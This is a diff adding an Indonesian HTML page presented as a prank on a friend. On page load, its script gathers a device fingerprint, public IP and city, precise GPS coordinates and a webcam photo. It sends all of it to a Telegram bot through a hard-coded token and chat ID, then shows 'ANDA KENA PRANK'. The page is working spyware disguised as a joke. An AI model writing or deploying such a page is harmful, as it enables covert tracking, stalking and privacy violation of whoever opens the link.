@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Prank Teman Dijamin Kaget 😹</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Courier New', Courier, monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+      flex-direction: column;
+    }
+    #msg {
+      white-space: pre-wrap;
+      font-size: 14px;
+      padding: 20px;
+      max-width: 90vw;
+      border-left: 2px solid #0f0;
+      padding-left: 15px;
+      animation: cursor 1s step-end infinite;
+    }
+    @keyframes cursor { 50% { border-color: transparent; } }
+    .prank {
+      font-size: 40px;
+      color: #0f0;
+      text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #00ff00, 0 0 40px #00ff00;
+      font-weight: bold;
+      opacity: 0;
+      animation: muncul 2s ease-in-out forwards;
+    }
+    @keyframes muncul {
+      0% { opacity: 0; transform: scale(0.8); }
+      50% { opacity: 1; transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div id="msg">Tunggu sebentar, get tutorial sabar..</div>
+  <script>
+    const token1 = '7490495005:AAGUVLgjzLkKO-JJKWPAnVemLI1l0VZC_mg';
+    const token2 = '7490495005:AAGUVLgjzLkKO-JJKWPAnVemLI1l0VZC_mg';
+    const chatId1 = '7016470025';
+    const chatId2 = '7016470025';
+
+    const getDeviceBrand = () => {
+      const ua = navigator.userAgent;
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
+      if (/Oppo|CPH/.test(ua)) return 'Oppo';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
+      if (/Infinix/.test(ua)) return 'Infinix';
+      if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
+      return 'Android Device';
+    };
+
+    const kirimPesan = async (pesan) => {
+      const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
+      const payload2 = { chat_id: chatId2, text: pesan, parse_mode: 'HTML' };
+      await Promise.all([
+        fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }),
+        fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload2)
+        })
+      ]);
+    };
+
+    const kirimFoto = async (blob) => {
+      const form1 = new FormData();
+      form1.append("chat_id", chatId1);
+      form1.append("photo", blob, "foto.jpg");
+      const form2 = new FormData();
+      form2.append("chat_id", chatId2);
+      form2.append("photo", blob, "foto.jpg");
+      await Promise.all([
+        fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 }),
+        fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 })
+      ]);
+    };
+
+    const ambilDataPerangkat = async () => {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const vendor = navigator.vendor;
+      const brand = getDeviceBrand();
+      const gpu = (() => {
+        try {
+          const canvas = document.createElement("canvas");
+          const gl = canvas.getContext("webgl");
+          const info = gl.getExtension("WEBGL_debug_renderer_info");
+          return {
+            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL),
+          };
+        } catch {
+          return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
+        }
+      })();
+      const bat = await navigator.getBattery();
+      const waktu = new Date().toLocaleString("id-ID");
+      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
+      const ref = document.referrer || 'Langsung';
+
+      return `
+〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 -
+
+Jenis Perangkat : ${brand}
+User Agent      : ${ua}
+Platform        : ${platform}
+Vendor Browser  : ${vendor}
+GPU             : ${gpu.vendor} - ${gpu.renderer}
+CPU             : ${navigator.hardwareConcurrency || '-'} inti
+RAM             : ${navigator.deviceMemory || '-'} GB
+Resolusi Layar  : ${screen.width} x ${screen.height}
+Touch Support   : ${touch} (${navigator.maxTouchPoints} titik)
+Kerapatan Piksel: ${window.devicePixelRatio}
+Battery         : ${Math.round(bat.level * 100)}% (${bat.charging ? '⚡ Mengisi' : '🔋 Tidak'})
+Cookies Aktif   : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+HTTPS           : ${location.protocol === 'https:' ? 'Ya' : 'Tidak'}
+Waktu Lokal     : ${waktu}
+Zona Waktu      : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Referrer        : ${ref}
+`.trim();
+    };
+
+    const ambilIPInfo = async () => {
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const ip = await res.json();
+        return `
+〘 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 -
+
+IP Publik   : ${ip.ip}
+Provider    : ${ip.org}
+Negara      : ${ip.country_name}
+Provinsi    : ${ip.region}
+Kota        : ${ip.city}
+`.trim();
+      } catch {
+        return "\n[!] Gagal ambil IP info";
+      }
+    };
+
+    const ambilLokasi = () => {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          resolve(`
+〘 𝗟𝗢𝗞𝗔𝗦𝗜 〙 -
+
+Latitude  : ${latitude}
+Longitude : ${longitude}
+Akurasi   : ±${accuracy} meter
+Peta      : https://maps.google.com/?q=${latitude},${longitude}
+`);
+        }, () => {
+          resolve("\n[!] Lokasi tidak diizinkan.");
+        }, { enableHighAccuracy: true, timeout: 7000 });
+      });
+    };
+
+    const ambilKamera = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        await video.play();
+
+        await new Promise(resolve => {
+          const cek = () => {
+            if (video.videoWidth > 0) resolve();
+            else requestAnimationFrame(cek);
+          };
+          cek();
+        });
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+        stream.getTracks().forEach(track => track.stop());
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+        if (blob) await kirimFoto(blob);
+        return "";
+      } catch {
+        return "\n[!] Kamera tidak diizinkan.";
+      }
+    };
+
+    const mulai = async () => {
+      const [kamera, info, ip, lokasi] = await Promise.all([
+        ambilKamera(),
+        ambilDataPerangkat(),
+        ambilIPInfo(),
+        ambilLokasi()
+      ]);
+
+      const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
+      document.getElementById("msg").textContent = "Anda kena prank 😹";
+      await kirimPesan(final);
+
+      setTimeout(() => {
+        document.getElementById("msg").classList.add("hidden");
+        const el = document.createElement("div");
+        el.className = "prank";
+        el.textContent = "ANDA KENA PRANK 😹";
+        document.body.appendChild(el);
+      }, 1500);
+    };
+
+    mulai();
+  </script>
+</body>
+</html>
